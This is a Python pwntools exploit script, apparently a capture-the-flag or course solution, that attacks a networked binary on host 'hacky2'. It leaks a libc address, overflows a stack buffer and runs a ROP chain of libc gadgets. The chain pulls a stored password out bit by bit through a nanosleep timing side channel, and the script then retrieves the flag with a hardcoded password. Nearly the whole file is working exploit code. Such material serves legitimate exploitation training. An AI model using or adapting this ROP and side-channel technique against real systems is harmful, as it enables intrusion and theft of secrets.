#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13718
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


#If set to true, the password will be retrieved using a timed sidechannel.
#Else the hardcoded password is used.
retrieve_new_password = False
#This is the number of seconds we wait for EOF before the response is interpreted as bit 1.
#If connection is lost during this timeframe, response is interpreted as bit 0.
#Make sure that this number is always smaller then pow(2, sleep_exponent)
sidechannel_timeout = 0.5
#The remote program will sleep for pow(2, sleep_exponent) seconds using nanosleep()
sleep_exponent = 3


#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")

    if retrieve_new_password == True:
        password = get_password()
    else:
        password = b"Aishoom0iejoo0re7ohc\x00"

    print(f"(-) Using password: {password}")

    proc.write(password + b"\n")

    print("(-) Trying to retrieve flag.")
    proc.readuntil(b"\x1b[36mPassword: \x1b[33m")
    flag = proc.readline()
    if b'flag' in flag:
        print(f"(-) Successfully retrieved flag: {flag.decode()}")
    else:
        print("(-) Looks like something went wrong retrieving the flag...")

    proc.close()
    return


def get_password():

    #The idea here is very similar as for pwn17, but instead of injecting our own code we use a 
    #  ROP-Chain this time.
    #Ultimately we still use a time-based sidechannel to retrieve the password bit-by-bit.
    #This time we introduce the delay using the nanosleep() function from libc, which makes 
    #  use of the clock_nanosleep syscall, which is permitted by seccomp this time around.
    #To end the program the exit_goup syscall is used.
    #To retrieve the individual bits some ROP-Gadgets from libc (shift left/right, mov from memory, 
    #  ...) are used.
    #The conditional response is not realized using conditional jumps this time, but by setting 
    #  the second count for nanosleep() based on the bit we extracted.

    password = b""

    #Number of bytes on stack between beginning of char buf[1] in fun() and return address of fun
    offset_buf_to_retaddr = 0x9

    #address of static char pwd[0x100] from check_password(), which is located in .bss section
    addr_static_pwd_var = 0x404060

    #ROP-GADGET OFFSETS:
    # - Basic pop-ret ROP-Gadgets
    offset_libc_pop_rax_ret = 0x3be88
    offset_libc_pop_rcx_ret = 0x33923
    offset_libc_pop_rdi_ret = 0x23796
    offset_libc_pop_rsi_ret = 0x2590f
    offset_libc_pop_rdx_ret = 0xfbd1d
    # - Memory mov ROP-Gadgets
    offset_libc_mov_qword_ptr_rdx_0_ret = 0x133519
    offset_libc_mov_rax_MEMrax_ret = 0x11b528
    # - Shift right/left ROP-Gadgets
    offset_libc_shr_eax_cl_and_eax_1_ret = 0xfef6b
    offset_libc_shl_rax_cl_or_qword_ptr_rdi_rax_xor_eax_eax_ret = 0x3980a
    # - Syscall ROP-Gadget
    offset_libc_syscall_ret = 0x550da

    #libc function offsets
    offset_libc_stderr = 0x1cf5c0
    offset_libc_nanosleep = 0xc7970


    print("(-) Initiating password retrieval.")
    for curr_byte_index in range(0x000,0x100):
        print(f"    Byte #{curr_byte_index:{0}3d}: ", end='')
        curr_byte = 0
        for curr_bit_index in reversed(range(0,8)):
            proc = remote(host, port, fam='ipv4')
            proc.readuntil(b"\x1b[36mPassword: \x1b[33m")
            proc.write(b"Some random input...\n")
            proc.readuntil(b"\x1b[35mstderr = ")

            addr_libc_stderr_leak = proc.readuntil(b".\x1b[0m\n")[0:14]
            addr_libc_stderr = int(addr_libc_stderr_leak, 16)
            address_libc_base = addr_libc_stderr - offset_libc_stderr
            
            #print(hex(address_libc_base))
            #input()

            ropchain = b""

            #Here we override the bytes immediately following the byte at our current index, so 
            #  that we will only read the value of the lowest byte, even when copying a 64-bit 
            #  value to a register.
            #pwd[curr_byte_index + {1,2,3,4}] = \x00
            ropchain += p64(address_libc_base + offset_libc_pop_rdx_ret)
            ropchain += p64(addr_static_pwd_var + curr_byte_index + 1)
            ropchain += p64(address_libc_base + offset_libc_mov_qword_ptr_rdx_0_ret)

            #Now copy the value of the current byte to rax.
            #rax = pwd[curr_byte_index]
            ropchain += p64(address_libc_base + offset_libc_pop_rax_ret)
            ropchain += p64(addr_static_pwd_var + curr_byte_index)
            ropchain += p64(address_libc_base + offset_libc_mov_rax_MEMrax_ret)

            #Then shift rax to the right until the current bit is the lowest one and delete all 
            #  other bits. After this rax is 1, if the bit we're interested in is 1, or 0 else.
            #rax = (rax >> curr_bit_index) & 1
            ropchain += p64(address_libc_base + offset_libc_pop_rcx_ret)
            ropchain += p64(curr_bit_index)
            ropchain += p64(address_libc_base + offset_libc_shr_eax_cl_and_eax_1_ret)

            #SET struct timespec depending on current bit (1/0) and invoke nanosleep():
            # - SET [rdi+0x18] to number of seconds to sleep, if bit is 1
            #     NOTE that we shift rax to the left to increase this value. The number of bits we 
            #     shift here can be controlled using the variable sleep_exponent in this script.
            ropchain += p64(address_libc_base + offset_libc_pop_rcx_ret)
            ropchain += p64(sleep_exponent)
            ropchain += p64(address_libc_base + offset_libc_pop_rdi_ret)
            ropchain += p64(addr_static_pwd_var + 0x18)
            ropchain += p64(address_libc_base + offset_libc_shl_rax_cl_or_qword_ptr_rdi_rax_xor_eax_eax_ret)
            # - SET [rdi+0x18] to 0 (number of nanoseconds to sleep)
            ropchain += p64(address_libc_base + offset_libc_pop_rdx_ret)
            ropchain += p64(addr_static_pwd_var + 0x20)
            ropchain += p64(address_libc_base + offset_libc_mov_qword_ptr_rdx_0_ret)
            # struct timespec is now at memory location pwd[0x18]
            # call nanosleep on struct to sleep scpecified amount of seconds
            ropchain += p64(address_libc_base + offset_libc_pop_rdi_ret)
            ropchain += p64(addr_static_pwd_var + 0x18)
            ropchain += p64(address_libc_base + offset_libc_pop_rsi_ret)
            ropchain += p64(0)
            ropchain += p64(address_libc_base + offset_libc_nanosleep)
            
            #then invoke exit_group syscall to terminate program
            ropchain += p64(address_libc_base + offset_libc_pop_rdi_ret)
            ropchain += p64(0)
            ropchain += p64(address_libc_base + offset_libc_pop_rax_ret)
            ropchain += p64(231)
            ropchain += p64(address_libc_base + offset_libc_syscall_ret)

            exploit_str = offset_buf_to_retaddr * b"A" + ropchain + b"\n\x00"

            proc.write(exploit_str)
            try:
                proc.readline(timeout = sidechannel_timeout)
                curr_bit = 1
            except EOFError:
                curr_bit = 0
            finally:
                print(f"{curr_bit}", end='')
                curr_byte = (curr_byte << 1) + curr_bit
                proc.close()

        print(f" {chr(curr_byte)}")
        password += curr_byte.to_bytes(1, 'little')

        if curr_byte == 0:
            break

    print(f"(-) Retrieved Password: {password}")
    return password


#Invoke the exploit when the script is executed.
exploit()


